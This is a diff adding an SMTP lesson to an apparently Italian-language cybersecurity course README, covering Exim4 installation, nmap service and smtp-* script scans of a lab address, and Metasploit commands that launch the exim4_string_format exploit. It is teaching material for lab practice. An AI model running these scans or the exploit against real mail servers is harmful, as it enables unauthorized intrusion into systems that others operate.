@@ -1990,23 +1990,48 @@ _____________________________________________________________________
 
 
 
+# SIMPLE MESSAGE TRANSFER PROTOCOL SMTP
+
+<img width="374" alt="Screenshot 2024-02-14 alle 10 35 02" src="https://github.com/MrMagicalSoftware/complete-academy-cybersec/assets/98833112/b578207a-9113-4774-9a94-bff944a1501a">
+
+Simple Mail Transport Protocol, or SMTP as it is commonly known, is among the most important protocols in our digital age. It is used to transfer email from one user to another. Although SMTP was first codified in 1983, it is still this same protocol that carries nearly all emails with some enhancements.
 
 
 
+![Screenshot 2024-02-14 alle 10 41 06](https://github.com/MrMagicalSoftware/complete-academy-cybersec/assets/98833112/ce24a24e-5ea3-49e3-a018-8cd0f090bc71)
+
+
+**installare smtp ( exim4 server in linux)**
+
+
+Exim4 è un agente di trasferimento di posta (MTA - Mail Transfer Agent) utilizzato principalmente nei sistemi operativi basati su Unix, come Linux. La sua funzione principale è quella di trasferire e recapitare messaggi di posta elettronica tra i server di posta all'interno di una rete o su Internet.
+
+
+```
+sudo apt install exim4
+sudo dpkg-reconfigure exim4-config
+```
+
+
+https://ubuntu.com/server/docs/mail-exim4
 
 
 
+**Scansione con nmap**
+
+```
+nmap -sT -A 192.168.56.103 -p25
+nmap --script=smtp-* 192.168.56.103 -p 25
+```
+<img width="533" alt="Screenshot 2024-02-14 alle 10 48 59" src="https://github.com/MrMagicalSoftware/complete-academy-cybersec/assets/98833112/6950c202-21f6-4749-af8c-e4b0e61b7f18">
 
 
-
-
-
-
-
-
-
-
-
+```
+msf5 > search type: exploits exim
+msf5> use exploit/unix/smtp/exim4_string_format
+kali > info
+msf5> exploit
+```
 
 
 
